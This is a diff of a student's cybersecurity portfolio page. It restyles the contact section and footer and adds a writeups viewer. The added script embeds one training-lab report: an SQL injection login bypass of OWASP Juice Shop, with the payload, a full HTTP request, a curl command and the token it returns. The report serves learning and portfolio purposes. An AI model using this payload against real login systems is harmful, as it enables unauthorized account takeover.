-                                <div class="flex items-center gap-3.5 min-w-0">
-                                    <span class="flex h-11 w-11 shrink-0 items-center justify-center rounded-xl border border-cyberCyan/30 bg-cyberCyan/10 text-cyberCyan">
-                                        <svg class="h-5 w-5" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
-                                            <path stroke-linecap="round" stroke-linejoin="round"
-                                                d="M3 8l7.89 5.26a2 2 0 002.22 0L21 8M5 19h14a2 2 0 002-2V7a2 2 0 00-2-2H5a2 2 0 00-2 2v10a2 2 0 002 2z" />
-                                        </svg>
-                                    </span>
-                                    <div class="min-w-0">
-                                        <p class="font-mono text-[11px] uppercase tracking-wider text-slate-400">Email</p>
-                                        <a href="mailto:a.mahapatra3000@gmail.com"
-                                            class="block truncate text-sm font-semibold text-white hover:text-cyberCyan">
-                                            a.mahapatra3000@gmail.com
-                                        </a>
-                                    </div>
+                        <div class="cyber-panel rounded-2xl p-5">
+                            <div class="flex items-center justify-between gap-3">
+                                <div class="min-w-0">
+                                    <p class="font-mono text-[11px] uppercase tracking-wider text-neonEmerald">Email</p>
+                                    <a href="mailto:a.mahapatra3000@gmail.com"
+                                        class="mt-1 block truncate font-mono text-sm font-semibold text-white hover:text-neonCyan">
+                                        a.mahapatra3000@gmail.com
+                                    </a>
                                 </div>
                                 <button id="copyEmailBtn" type="button"
-                                    class="shrink-0 rounded-lg border border-slate-700 bg-obsidian px-3 py-1.5 font-mono text-[11px] font-semibold text-cyberCyan transition hover:border-cyberCyan hover:bg-cyberCyan/10">
-                                    Copy
+                                    class="shrink-0 rounded-lg border border-neonEmerald/40 bg-neonEmerald/10 px-3 py-1.5 font-mono text-xs font-semibold text-neonEmerald transition hover:bg-neonEmerald hover:text-obsidian">
+                                    Copy Email
                                 </button>
                             </div>
                         </div>
 
-                        <!-- GitHub Card -->
                         <a href="https://github.com/Anuraag-Mahapatra" target="_blank" rel="noopener noreferrer"
-                            class="glass-card group flex items-center justify-between rounded-2xl p-5 transition hover:border-cyberCyan/40">
-                            <div class="flex items-center gap-3.5">
-                                <span class="flex h-11 w-11 shrink-0 items-center justify-center rounded-xl border border-slate-700 bg-obsidian text-white transition group-hover:border-cyberCyan group-hover:text-cyberCyan">
-                                    <svg class="h-5 w-5" fill="currentColor" viewBox="0 0 24 24">
-                                        <path fill-rule="evenodd" clip-rule="evenodd"
-                                            d="M12 2C6.477 2 2 6.484 2 12.017c0 4.425 2.865 8.18 6.839 9.504.5.092.682-.217.682-.483 0-.237-.008-.868-.013-1.703-2.782.605-3.369-1.343-3.369-1.343-.454-1.158-1.11-1.466-1.11-1.466-.908-.62.069-.608.069-.608 1.003.07 1.53 1.032 1.53 1.032.892 1.53 2.341 1.088 2.91.832.092-.647.35-1.088.636-1.338-2.22-.253-4.555-1.113-4.555-4.951 0-1.093.39-1.988 1.029-2.688-.103-.253-.446-1.272.098-2.65 0 0 .84-.27 2.75 1.026A9.564 9.564 0 0112 6.844c.85.004 1.705.115 2.504.337 1.909-1.296 2.747-1.027 2.747-1.027.546 1.379.202 2.398.1 2.651.64.7 1.028 1.595 1.028 2.688 0 3.848-2.339 4.695-4.566 4.943.359.309.678.92.678 1.855 0 1.338-.012 2.419-.012 2.747 0 .268.18.58.688.482A10.019 10.019 0 0022 12.017C22 6.484 17.522 2 12 2z" />
-                                    </svg>
-                                </span>
-                                <div>
-                                    <p class="font-mono text-[11px] uppercase tracking-wider text-slate-400">GitHub</p>
-                                    <p class="text-sm font-semibold text-white group-hover:text-cyberCyan">@Anuraag-Mahapatra</p>
-                                </div>
+                            class="cyber-panel flex items-center justify-between rounded-2xl p-5 transition hover:border-neonCyan/50">
+                            <div class="min-w-0">
+                                <p class="font-mono text-[11px] uppercase tracking-wider text-slate-400">GitHub</p>
+                                <p class="mt-1 truncate font-mono text-sm font-semibold text-white">github.com/Anuraag-Mahapatra</p>
                             </div>
-                            <svg class="h-4 w-4 text-slate-500 transition group-hover:translate-x-1 group-hover:text-cyberCyan" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
-                                <path stroke-linecap="round" stroke-linejoin="round" d="M14 5l7 7m0 0l-7 7m7-7H3" />
-                            </svg>
+                            <span class="shrink-0 font-mono text-xs text-neonCyan">Visit &nearr;</span>
                         </a>
 
-                        <!-- LinkedIn Card -->
                         <a href="https://www.linkedin.com/in/anuraag-mahapatra-1033b933b" target="_blank" rel="noopener noreferrer"
-                            class="glass-card group flex items-center justify-between rounded-2xl p-5 transition hover:border-cyberEmerald/40">
-                            <div class="flex items-center gap-3.5">
-                                <span class="flex h-11 w-11 shrink-0 items-center justify-center rounded-xl border border-slate-700 bg-obsidian text-white transition group-hover:border-cyberEmerald group-hover:text-cyberEmerald">
-                                    <svg class="h-5 w-5" fill="currentColor" viewBox="0 0 24 24">
-                                        <path
-                                            d="M19 3a2 2 0 0 1 2 2v14a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h14m-.5 15.5v-5.3a3.26 3.26 0 0 0-3.26-3.26c-.85 0-1.84.52-2.28 1.3v-1.11h-2.79v8.37h2.79v-4.93c0-.77.62-1.4 1.39-1.4a1.4 1.4 0 0 1 1.4 1.4v4.93h2.75M6.88 8.56a1.68 1.68 0 0 0 1.68-1.68c0-.93-.75-1.69-1.68-1.69a1.69 1.69 0 0 0-1.69 1.69c0 .93.76 1.68 1.69 1.68m1.39 9.94v-8.37H5.5v8.37h2.77z" />
-                                    </svg>
-                                </span>
-                                <div>
-                                    <p class="font-mono text-[11px] uppercase tracking-wider text-slate-400">LinkedIn</p>
-                                    <p class="text-sm font-semibold text-white group-hover:text-cyberEmerald">Anuraag Mahapatra</p>
-                                </div>
+                            class="cyber-panel flex items-center justify-between rounded-2xl p-5 transition hover:border-neonEmerald/50">
+                            <div class="min-w-0">
+                                <p class="font-mono text-[11px] uppercase tracking-wider text-slate-400">LinkedIn</p>
+                                <p class="mt-1 truncate font-mono text-sm font-semibold text-white">Anuraag Mahapatra</p>
                             </div>
-                            <svg class="h-4 w-4 text-slate-500 transition group-hover:translate-x-1 group-hover:text-cyberEmerald" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
-                                <path stroke-linecap="round" stroke-linejoin="round" d="M14 5l7 7m0 0l-7 7m7-7H3" />
-                            </svg>
+                            <span class="shrink-0 font-mono text-xs text-neonEmerald">Connect &nearr;</span>
                         </a>
 
-                        <!-- Location Card -->
-                        <div class="glass-card flex items-center gap-3.5 rounded-2xl p-5">
-                            <span class="flex h-11 w-11 shrink-0 items-center justify-center rounded-xl border border-cyberEmerald/30 bg-cyberEmerald/10 text-cyberEmerald">
-                                <svg class="h-5 w-5" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
-                                    <path stroke-linecap="round" stroke-linejoin="round"
-                                        d="M17.657 16.657L13.414 20.9a1.998 1.998 0 01-2.827 0l-4.244-4.243a8 8 0 1111.314 0z" />
-                                    <path stroke-linecap="round" stroke-linejoin="round" d="M15 11a3 3 0 11-6 0 3 3 0 016 0z" />
-                                </svg>
-                            </span>
-                            <div>
-                                <p class="font-mono text-[11px] uppercase tracking-wider text-slate-400">Location</p>
-                                <p class="text-sm font-semibold text-white">Bhubaneswar, Odisha, India</p>
-                            </div>
+                        <div class="cyber-panel rounded-2xl p-5">
+                            <p class="font-mono text-[11px] uppercase tracking-wider text-slate-400">Location</p>
+                            <p class="mt-1 text-sm font-medium text-white">Bhubaneswar, Odisha, India</p>
                         </div>
                     </div>
 
-                    <!-- Right Column: Interactive Contact Form -->
+                    <!-- Validated Mailto Form -->
                     <div class="lg:col-span-7">
-                        <form id="contactForm" novalidate class="glass-card space-y-5 rounded-2xl p-6 sm:p-8">
-                            <div class="grid grid-cols-1 gap-5 sm:grid-cols-2">
+                        <form id="contactForm" class="cyber-panel space-y-4 rounded-2xl p-6 sm:p-8" novalidate>
+                            <div class="grid grid-cols-1 gap-4 sm:grid-cols-2">
                                 <div>
-                                    <label for="senderName" class="mb-1.5 block font-mono text-xs font-medium text-slate-300">Your Name *</label>
-                                    <input id="senderName" name="name" type="text" required placeholder="Jane Doe"
-                                        class="w-full rounded-xl border border-slate-700 bg-obsidian/90 px-4 py-3 text-sm text-white placeholder-slate-500 transition focus:border-cyberCyan focus:outline-none">
+                                    <label for="cName" class="mb-1.5 block font-mono text-xs text-slate-300">Name *</label>
+                                    <input id="cName" type="text" required placeholder="Your name"
+                                        class="w-full rounded-xl border border-borderDark bg-obsidian px-4 py-2.5 text-sm text-white placeholder-slate-500 focus:border-neonCyan focus:outline-none">
                                 </div>
                                 <div>
-                                    <label for="senderEmail" class="mb-1.5 block font-mono text-xs font-medium text-slate-300">Your Email *</label>
-                                    <input id="senderEmail" name="email" type="email" required placeholder="jane@company.com"
-                                        class="w-full rounded-xl border border-slate-700 bg-obsidian/90 px-4 py-3 text-sm text-white placeholder-slate-500 transition focus:border-cyberCyan focus:outline-none">
+                                    <label for="cEmail" class="mb-1.5 block font-mono text-xs text-slate-300">Email *</label>
+                                    <input id="cEmail" type="email" required placeholder="you@example.com"
+                                        class="w-full rounded-xl border border-borderDark bg-obsidian px-4 py-2.5 text-sm text-white placeholder-slate-500 focus:border-neonCyan focus:outline-none">
                                 </div>
                             </div>
 
                             <div>
-                                <label for="senderSubject" class="mb-1.5 block font-mono text-xs font-medium text-slate-300">Subject *</label>
-                                <input id="senderSubject" name="subject" type="text" required placeholder="Internship Opportunity / CTF Collaboration"
-                                    class="w-full rounded-xl border border-slate-700 bg-obsidian/90 px-4 py-3 text-sm text-white placeholder-slate-500 transition focus:border-cyberCyan focus:outline-none">
+                                <label for="cMessage" class="mb-1.5 block font-mono text-xs text-slate-300">Message *</label>
+                                <textarea id="cMessage" rows="5" required placeholder="Hi Anuraag, I saw your portfolio and would love to connect..."
+                                    class="w-full rounded-xl border border-borderDark bg-obsidian px-4 py-2.5 text-sm text-white placeholder-slate-500 focus:border-neonCyan focus:outline-none"></textarea>
                             </div>
 
-                            <div>
-                                <label for="senderMessage" class="mb-1.5 block font-mono text-xs font-medium text-slate-300">Message *</label>
-                                <textarea id="senderMessage" name="message" rows="4" required
-                                    placeholder="Hi Anuraag, I came across your portfolio and would love to connect..."
-                                    class="w-full resize-none rounded-xl border border-slate-700 bg-obsidian/90 px-4 py-3 text-sm text-white placeholder-slate-500 transition focus:border-cyberCyan focus:outline-none"></textarea>
-                            </div>
+                            <p id="contactError" class="hidden font-mono text-xs text-rose-400"></p>
 
-                            <!-- Inline Validation Feedback -->
-                            <p id="formError" class="hidden font-mono text-xs text-rose-400"></p>
-
-                            <div class="flex flex-wrap items-center justify-between gap-4 pt-1">
-                                <span class="font-mono text-[11px] text-slate-400">Opens a pre-filled email draft to Anuraag.</span>
-                                <button type="submit"
-                                    class="inline-flex items-center gap-2 rounded-xl bg-gradient-to-r from-cyberCyan to-cyberEmerald px-6 py-3 text-sm font-bold text-obsidian shadow-cyan-glow transition hover:brightness-110">
-                                    Send Message
-                                    <svg class="h-4 w-4" fill="none" stroke="currentColor" stroke-width="2.5" viewBox="0 0 24 24">
-                                        <path stroke-linecap="round" stroke-linejoin="round" d="M12 19l9 2-9-18-9 18 9-2zm0 0v-8" />
-                                    </svg>
-                                </button>
-                            </div>
+                            <button type="submit"
+                                class="inline-flex w-full items-center justify-center gap-2 rounded-xl bg-gradient-to-r from-neonEmerald to-neonCyan px-6 py-3 font-mono text-xs font-bold text-obsidian shadow-emerald-glow transition hover:brightness-110 sm:w-auto">
+                                Open Pre-Filled Email Draft &rarr;
+                            </button>
                         </form>
                     </div>
                 </div>
@@ -696,44 +757,104 @@
         </section>
     </main>
 
+    <!-- ==================== DEDICATED READ-ONLY WRITEUPS VIEW ==================== -->
+    <main id="writeupsView" class="hidden flex-1 py-10 sm:py-14">
+        <div class="mx-auto max-w-5xl px-4 sm:px-6 lg:px-8">
+
+            <!-- SUB-VIEW 1: WRITEUPS HUB -->
+            <div id="writeupsHub">
+                <div class="mb-6">
+                    <a href="#home"
+                        class="inline-flex items-center gap-2 rounded-xl border border-borderDark bg-panel px-4 py-2 font-mono text-xs font-semibold text-slate-200 transition hover:border-neonCyan hover:text-neonCyan">
+                        &larr; Back to Portfolio
+                    </a>
+                </div>
+
+                <!-- Header Banner -->
+                <div class="cyber-panel mb-8 rounded-2xl border border-neonEmerald/30 p-6 sm:p-8">
+                    <p class="font-mono text-xs font-semibold uppercase tracking-widest text-neonEmerald">~/writeups // Read-Only Security Archive</p>
+                    <h1 class="mt-2 text-3xl font-extrabold tracking-tight text-white sm:text-4xl">Security Writeups &amp; Bug Reports</h1>
+                    <p class="mt-2 max-w-2xl text-sm leading-relaxed text-slate-300 sm:text-base">
+                        Documented vulnerability assessments, proof-of-concept requests, and exploitation analyses from authorized training labs.
+                    </p>
+                </div>
+
+                <!-- Search & Dynamic Filter Pills -->
+                <div class="mb-8 space-y-4">
+                    <div class="relative">
+                        <svg class="pointer-events-none absolute top-1/2 left-4 h-4 w-4 -translate-y-1/2 text-slate-400" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
+                            <path stroke-linecap="round" stroke-linejoin="round" d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z" />
+                        </svg>
+                        <input id="writeupSearch" type="search" autocomplete="off"
+                            placeholder="Search writeups by title, target, CWE, or tag..."
+                            class="w-full rounded-xl border border-borderDark bg-panel py-3 pr-4 pl-11 font-mono text-sm text-white placeholder-slate-500 focus:border-neonCyan focus:outline-none">
+                    </div>
+
+                    <div class="flex flex-col justify-between gap-3 sm:flex-row sm:items-center">
+                        <div id="writeupCategoryFilters" class="flex flex-wrap items-center gap-2"></div>
+                        <div id="writeupSeverityFilters" class="flex flex-wrap items-center gap-2"></div>
+                    </div>
+                </div>
+
+                <!-- Writeup Cards -->
+                <div id="writeupsGrid" class="grid grid-cols-1 gap-6"></div>
+
+                <!-- Empty Search State -->
+                <div id="writeupsEmpty" class="hidden cyber-panel rounded-2xl p-10 text-center">
+                    <p class="font-mono text-sm text-neonCyan">&gt; No writeups match your current filter.</p>
+                    <p class="mt-1.5 text-sm text-slate-400">Clear the search query or reset filters to view all published reports.</p>
+                </div>
+            </div>
+
+            <!-- SUB-VIEW 2: WRITEUP DETAIL READER -->
+            <article id="writeupReader" class="hidden">
+                <!-- Reader Top Actions -->
+                <div class="mb-6 flex flex-wrap items-center justify-between gap-3">
+                    <button id="backToWriteupsBtn" type="button"
+                        class="inline-flex items-center gap-2 rounded-xl border border-borderDark bg-panel px-4 py-2 font-mono text-xs font-semibold text-slate-200 transition hover:border-neonCyan hover:text-neonCyan">
+                        &larr; Back to Writeups
+                    </button>
+
+                    <div class="flex flex-wrap items-center gap-2.5">
+                        <button id="copyWriteupLinkBtn" type="button"
+                            class="inline-flex items-center gap-1.5 rounded-xl border border-borderDark bg-panel px-3.5 py-2 font-mono text-xs font-semibold text-slate-200 transition hover:border-neonCyan hover:text-neonCyan">
+                            Copy Link
+                        </button>
+                        <button id="downloadWriteupMdBtn" type="button"
+                            class="inline-flex items-center gap-1.5 rounded-xl border border-neonEmerald/40 bg-neonEmerald/10 px-3.5 py-2 font-mono text-xs font-semibold text-neonEmerald transition hover:bg-neonEmerald hover:text-obsidian">
+                            <svg class="h-3.5 w-3.5" fill="none" stroke="currentColor" stroke-width="2.2" viewBox="0 0 24 24">
+                                <path stroke-linecap="round" stroke-linejoin="round" d="M4 16v1a3 3 0 003 3h10a3 3 0 003-3v-1m-4-4l-4 4m0 0l-4-4m4 4V4" />
+                            </svg>
+                            Download .md
+                        </button>
+                    </div>
+                </div>
+
+                <!-- Metadata Header Box -->
+                <header id="readerMetaBox" class="cyber-panel mb-8 rounded-2xl border border-rose-500/35 p-6 sm:p-8"></header>
+
+                <!-- Rendered Markdown Body -->
+                <div class="cyber-panel rounded-2xl p-6 sm:p-10">
+                    <div id="readerBody" class="md-prose max-w-none"></div>
+                </div>
+            </article>
+        </div>
+    </main>
+
     <!-- ==================== FOOTER ==================== -->
-    <footer class="border-t border-slate-800/80 bg-obsidian/90 py-10">
-        <div class="mx-auto flex max-w-6xl flex-col items-center justify-between gap-6 px-4 sm:flex-row sm:px-6 lg:px-8">
+    <footer class="border-t border-borderDark bg-obsidian/95 py-8">
+        <div class="mx-auto flex max-w-6xl flex-col items-center justify-between gap-4 px-4 sm:flex-row sm:px-6 lg:px-8">
             <div class="text-center sm:text-left">
-                <p class="font-display text-sm font-bold text-white">&copy; 2026 Anuraag Mahapatra</p>
-                <p class="mt-0.5 font-mono text-xs text-slate-400">Offensive Security &middot; CTF Dev &middot; Full-Stack Web</p>
+                <p class="text-sm font-bold text-white">&copy; 2026 Anuraag Mahapatra</p>
+                <p class="mt-0.5 font-mono text-xs text-slate-400">Offensive Security &middot; CTF Development &middot; OUTR Bhubaneswar</p>
             </div>
-
-            <div class="flex flex-wrap items-center justify-center gap-5 text-xs font-medium text-slate-400">
-                <a href="#home" class="transition hover:text-cyberCyan">Home</a>
-                <a href="#about" class="transition hover:text-cyberCyan">About</a>
-                <a href="#skills" class="transition hover:text-cyberCyan">Skills</a>
-                <a href="#projects" class="transition hover:text-cyberCyan">Projects</a>
-                <a href="#contact" class="transition hover:text-cyberCyan">Contact</a>
-            </div>
-
-            <div class="flex items-center gap-3">
-                <a href="https://github.com/Anuraag-Mahapatra" target="_blank" rel="noopener noreferrer" aria-label="GitHub"
-                    class="rounded-lg border border-slate-800 bg-navy p-2 text-slate-400 transition hover:border-cyberCyan hover:text-cyberCyan">
-                    <svg class="h-4 w-4" fill="currentColor" viewBox="0 0 24 24">
-                        <path fill-rule="evenodd" clip-rule="evenodd"
-                            d="M12 2C6.477 2 2 6.484 2 12.017c0 4.425 2.865 8.18 6.839 9.504.5.092.682-.217.682-.483 0-.237-.008-.868-.013-1.703-2.782.605-3.369-1.343-3.369-1.343-.454-1.158-1.11-1.466-1.11-1.466-.908-.62.069-.608.069-.608 1.003.07 1.53 1.032 1.53 1.032.892 1.53 2.341 1.088 2.91.832.092-.647.35-1.088.636-1.338-2.22-.253-4.555-1.113-4.555-4.951 0-1.093.39-1.988 1.029-2.688-.103-.253-.446-1.272.098-2.65 0 0 .84-.27 2.75 1.026A9.564 9.564 0 0112 6.844c.85.004 1.705.115 2.504.337 1.909-1.296 2.747-1.027 2.747-1.027.546 1.379.202 2.398.1 2.651.64.7 1.028 1.595 1.028 2.688 0 3.848-2.339 4.695-4.566 4.943.359.309.678.92.678 1.855 0 1.338-.012 2.419-.012 2.747 0 .268.18.58.688.482A10.019 10.019 0 0022 12.017C22 6.484 17.522 2 12 2z" />
-                    </svg>
-                </a>
-                <a href="https://www.linkedin.com/in/anuraag-mahapatra-1033b933b" target="_blank" rel="noopener noreferrer" aria-label="LinkedIn"
-                    class="rounded-lg border border-slate-800 bg-navy p-2 text-slate-400 transition hover:border-cyberEmerald hover:text-cyberEmerald">
-                    <svg class="h-4 w-4" fill="currentColor" viewBox="0 0 24 24">
-                        <path
-                            d="M19 3a2 2 0 0 1 2 2v14a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h14m-.5 15.5v-5.3a3.26 3.26 0 0 0-3.26-3.26c-.85 0-1.84.52-2.28 1.3v-1.11h-2.79v8.37h2.79v-4.93c0-.77.62-1.4 1.39-1.4a1.4 1.4 0 0 1 1.4 1.4v4.93h2.75M6.88 8.56a1.68 1.68 0 0 0 1.68-1.68c0-.93-.75-1.69-1.68-1.69a1.69 1.69 0 0 0-1.69 1.69c0 .93.76 1.68 1.69 1.68m1.39 9.94v-8.37H5.5v8.37h2.77z" />
-                    </svg>
-                </a>
-                <a href="mailto:a.mahapatra3000@gmail.com" aria-label="Email"
-                    class="rounded-lg border border-slate-800 bg-navy p-2 text-slate-400 transition hover:border-cyberCyan hover:text-cyberCyan">
-                    <svg class="h-4 w-4" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
-                        <path stroke-linecap="round" stroke-linejoin="round"
-                            d="M3 8l7.89 5.26a2 2 0 002.22 0L21 8M5 19h14a2 2 0 002-2V7a2 2 0 00-2-2H5a2 2 0 00-2 2v10a2 2 0 002 2z" />
-                    </svg>
-                </a>
+            <div class="flex flex-wrap items-center gap-5 font-mono text-xs text-slate-400">
+                <a href="#about" class="transition hover:text-neonEmerald">About</a>
+                <a href="#skills" class="transition hover:text-neonEmerald">Skills</a>
+                <a href="#experience" class="transition hover:text-neonEmerald">Experience</a>
+                <a href="#projects" class="transition hover:text-neonEmerald">Projects</a>
+                <a href="#writeups" class="transition hover:text-neonEmerald">Writeups</a>
+                <a href="#contact" class="transition hover:text-neonCyan">Contact</a>
             </div>
         </div>
     </footer>
@@ -741,26 +862,133 @@
     <!-- ==================== TOAST NOTIFICATION ==================== -->
     <div id="toast" role="status" aria-live="polite"
         class="pointer-events-none fixed right-5 bottom-5 z-50 translate-y-4 opacity-0 transition-all duration-300">
-        <div class="flex items-center gap-2.5 rounded-xl border border-cyberEmerald/40 bg-navy px-4 py-3 font-mono text-xs text-white shadow-emerald-glow">
-            <span class="h-2 w-2 rounded-full bg-cyberEmerald"></span>
-            <span id="toastMessage">Action completed</span>
+        <div class="flex items-center gap-2.5 rounded-xl border border-neonEmerald/40 bg-panel px-4 py-3 font-mono text-xs text-white shadow-emerald-glow">
+            <span class="h-2 w-2 rounded-full bg-neonEmerald"></span>
+            <span id="toastText">Copied</span>
         </div>
     </div>
 
-    <!-- ==================== APPLICATION LOGIC ==================== -->
+    <!-- ==================== APPLICATION SCRIPT ==================== -->
     <script>
         (function () {
             'use strict';
 
-            /* ---------- 1. Project Catalog Data ---------- */
+            const FENCE = '\x60\x60\x60';
+
+            /* =========================================================================
+             *  SECURITY WRITEUPS REGISTRY (OWNER-MANAGED — STRICTLY READ-ONLY)
+             * =========================================================================
+             *  HOW TO ADD A NEW WRITEUP LATER:
+             *  1. Copy the template object below and paste it at the TOP of `WRITEUPS`.
+             *  2. Assign a unique URL-safe `id` (becomes `#writeups/<id>`).
+             *  3. Paste your Markdown lines into `markdown`.
+             *  4. Save & push — navbar badge count, filters, search, reader, and
+             *     `.md` download all update automatically!
+             *
+             *  TEMPLATE:
+             *  {
+             *      id: 'my-new-bug-report',
+             *      title: 'Title of Vulnerability Report',
+             *      target: 'Target App Name',
+             *      date: 'Dec 2026',
+             *      severity: 'P2 - High', // 'P1 - Critical' | 'P2 - High' | 'P3 - Medium' | 'P4 - Low' | 'Info'
+             *      category: 'Web Exploitation',
+             *      cwe: 'CWE-79',
+             *      file: 'My_Report.md',
+             *      tags: ['XSS', 'Burp Suite'],
+             *      summary: 'Short 1–2 sentence overview of the finding and impact.',
+             *      markdown: [
+             *          '# Report Title',
+             *          '',
+             *          '## Summary',
+             *          'Write your Markdown content here...'
+             *      ].join('\n')
+             *  },
+             * ========================================================================= */
+            const WRITEUPS = [
+                {
+                    id: 'owasp-juice-shop-login-bypass',
+                    title: 'SQL Injection in Login Endpoint Enables Targeted Authentication Bypass via Email Field',
+                    target: 'OWASP Juice Shop',
+                    date: 'Nov 2026',
+                    severity: 'P1 - Critical',
+                    category: 'Web Exploitation',
+                    cwe: 'CWE-89, CWE-287',
+                    file: 'Login_Bypass.md',
+                    tags: ['SQLi', 'Authentication Bypass', 'OWASP Juice Shop', 'Burp Suite'],
+                    summary: 'Unparameterized SQL query construction in POST /rest/user/login allows targeted passwordless authentication as any known user via SQL comment injection in the email JSON parameter.',
+                    markdown: [
+                        '# *SQL Injection in Login Endpoint Enables Targeted Authentication Bypass via Email Field*',
+                        '',
+                        '## Environment',
+                        '- **Target:** OWASP Juice Shop (Intentionally made vulnerable training application)',
+                        '- **Version Image:** `bkimminich/juice-shop` (Docker)',
+                        '- **Tester:** `Anuraag Mahapatra`',
+                        '- **Note:** This is a training environment; the finding is documented for learning and portfolio purposes.',
+                        '',
+                        '## Summary',
+                        'A SQL Injection (SQLi) vulnerability exists in the login endpoint (`/rest/user/login`). Because the `email` parameter is directly put into a backend SQL query without parameterization, an attacker can inject SQL comment syntax (`\'--`) to bypass the password verification check and authenticate themselve as any known user\u2014including administrator \u2014 without knowing their password.',
+                        '',
+                        '- **Vulnerable URL:** `http://juiceshop.test:3000/#/login`',
+                        '- **Vulnerable Endpoint:** `POST rest/user/login`',
+                        '- **Affected Parameter:** `email` (JSON body)',
+                        '- **Suggested VRT Classification:** `Server-Side Injection > SQL Injection` (P1 - Critical)',
+                        '- **CWE:** `CWE-89 (SQL injection)` , `CWE-287 (Improper Authentication)`',
+                        '',
+                        '---',
+                        '',
+                        '## Steps to Reproduce',
+                        '1. Navigate to the login page at `http://juiceshop.test:3000/#/login`.',
+                        '2. In the **Email** field, enter the following SQL injection payload:',
+                        '   `uvogin@juice-sh.op\'--`',
+                        '3. In the **Password** field, enter any arbitrary string (e.g., `1234`).',
+                        '4. Click **Log in** (or send the request directly via Burp Repeater):',
+                        FENCE,
+                        'POST /rest/user/login HTTP/1.1',
+                        'Host: localhost:3000',
+                        'Content-Length: 52',
+                        'Content-Type: application/json',
+                        'Origin: http://localhost:3000',
+                        'Sec-Fetch-Site: same-origin',
+                        'Sec-Fetch-Mode: cors',
+                        'Sec-Fetch-Dest: empty',
+                        'Referer: http://localhost:3000/',
+                        'Accept-Encoding: gzip, deflate, br',
+                        'Connection: keep-alive',
+                        '',
+                        '{"email":"uvogin@juice-sh.op\'--","password":"1234"}',
+                        FENCE,
+                        '',
+                        '![Login Bypass Proof](./Screenshots/Screenshot_(367).png)',
+                        '![Login Bypass Proof](./Screenshots/Screenshot_(368).png)',
+                        '![Login Bypass Proof](./Screenshots/Screenshot_(369).png)',
+                        '![Login Bypass Proof](./Screenshots/Screenshot_(370).png)',
+                        '',
+                        '## **For instant reproduction:**',
+                        FENCE,
+                        "curl -s -X POST 'http://localhost:3000/rest/user/login' \\",
+                        "  -H 'Content-Type: application/json' \\",
+                        '  -d \'{"email":"uvogin@juice-sh.op\'\\\'\'--","password":"1234"}\'',
+                        FENCE,
+                        '## **Response:**',
+                        FENCE,
+                        '{"authentication":{"token":"eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJkYXRhIjp7ImlkIjoxNiwidXNlcm5hbWUiOiIiLCJlbWFpbCI6InV2b2dpbkBqdWljZS1zaC5vcCIsInBhc3N3b3JkIjoiMDVmOTIxNDhiNGI2MGY3ZGFjZDA0Y2NlZWJiOGYxYWYiLCJyb2xlIjoiY3VzdG9tZXIiLCJkZWx1eGVUb2tlbiI6IiIsImxhc3RMb2dpbklwIjoiIiwicHJvZmlsZUltYWdlIjoiYXNzZXRzL3B1YmxpYy9pbWFnZXMvdXBsb2Fkcy9kZWZhdWx0LnN2ZyIsInRvdHBTZWNyZXQiOiIiLCJpc0FjdGl2ZSI6dHJ1ZSwiY3JlYXRlZEF0IjoiMjAyNi0xMS0yNCAwNzozNDowNy4wMzcgKzAwOjAwIiwidXBkYXRlZEF0IjoiMjAyNi0xMS0yNCAwNzozNDowNy4wMzcgKzAwOjAwIiwiZGVsZXRlZEF0IjpudWxsfSwiYmlkIjo1LCJpYXQiOjE3OTU1MDk0NTl9.dC1aQyuesCvVDCnOAeyN_v_1O8JxJuF6WoreXcFuvq5qfM_wxWHT3WweAaqcVQy9LdXtckvK_xXVCNuNQPGD_HC7tMxHnwG7eqLiBmonfSSaJ4pixCeWYgZ5cgkdEIx_ZuBo_WGhpvakCKHhO_ZL7u6Fvbca1D0NVksm7QbZcII","bid":5,"umail":"uvogin@juice-sh.op"}}',
+                        FENCE
+                    ].join('\n')
+                }
+            ];
+
+            /* =========================================================================
+             *  PROJECTS CATALOG (Excludes Bento Grid; OWASP Juice Shop is in Writeups)
+             * ========================================================================= */
             const PROJECTS = [
                 {
-                    title: 'HackCTF Platform & 60 Challenges',
+                    title: 'HackCTF Platform & 60-Challenge Suite',
                     categories: ['cybersecurity', 'webdev'],
                     badges: ['Cybersecurity', 'Web Dev'],
                     description:
-                        'Offline Jeopardy-style CTF platform built for HackFest 2026 (TechSoc × Energy × OffSecDiary) featuring a dual-pane UI, browser-based Linux sandbox, live scoreboard, and 60 challenges across 7 categories (7,100 pts).',
-                    tech: ['Python', 'HTML/CSS/JS', 'Linux Sandbox', 'JSON API'],
+                        'Offline Jeopardy-style CTF platform built for HackFest 2026 featuring a browser Linux terminal sandbox, 60 challenges across Easy/Medium/Hard tiers, salted SHA-256 auth, and live scoreboard.',
+                    tech: ['Python', 'Linux Sandbox', 'SHA-256', 'HTML/CSS/JS'],
                     github: 'https://github.com/Anuraag-Mahapatra'
                 },
                 {
@@ -768,16 +996,16 @@
                     categories: ['cybersecurity', 'webdev'],
                     badges: ['Cybersecurity', 'Web Dev'],
                     description:
-                        'Multi-stage SQL injection cybersecurity demonstration simulating a reactor control system, bridged with an Arduino UNO hardware prototype for TechExpo.',
-                    tech: ['SQLi', 'Web Security', 'Arduino UNO', 'Embedded Systems'],
+                        'Multi-stage SQL injection sandbox simulating a reactor control system bridged with an Arduino UNO hardware interface for TechExpo.',
+                    tech: ['SQLi', 'Web Security', 'Arduino UNO', 'Cyber-Physical'],
                     github: 'https://github.com/Anuraag-Mahapatra'
                 },
                 {
                     title: 'NEXUS.SEC',
-                    categories: ['webdev', 'cybersecurity'],
-                    badges: ['Web Dev', 'Cybersecurity'],
+                    categories: ['cybersecurity', 'webdev'],
+                    badges: ['Cybersecurity', 'Web Dev'],
                     description:
-                        'Full-stack MERN web application designed to simulate vulnerability assessment and penetration testing workflows in a clean, structured interface.',
+                        'Full-stack MERN web application simulating vulnerability assessment and penetration testing (VAPT) workflows.',
                     tech: ['MongoDB', 'Express.js', 'React.js', 'Node.js'],
